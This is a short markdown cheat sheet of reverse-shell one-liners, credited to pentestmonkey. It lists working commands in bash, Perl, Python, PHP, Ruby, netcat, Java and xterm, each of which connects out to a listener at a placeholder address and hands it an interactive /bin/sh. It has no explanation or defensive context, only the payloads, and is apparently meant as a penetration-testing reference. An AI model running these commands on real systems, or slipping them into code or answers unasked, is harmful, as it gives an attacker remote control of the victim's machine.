># ___Reverse Shell Cheat Sheet___

> # _Reference [ pentestmonkey ](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)_

---

#  _BASH_
```bash
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
```

# _PERL_
```bash
perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
# _PYTHON_
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
# _PHP_
```bash
php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
# _RUBY_
```bash
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
# _NETCAT_
```bash
nc -e /bin/sh 127.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
```
# _JAVA_
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
# _XTERM_

```bash
xterm -display 127.0.0.1:1

Xnest :1

xhost +targetip
```

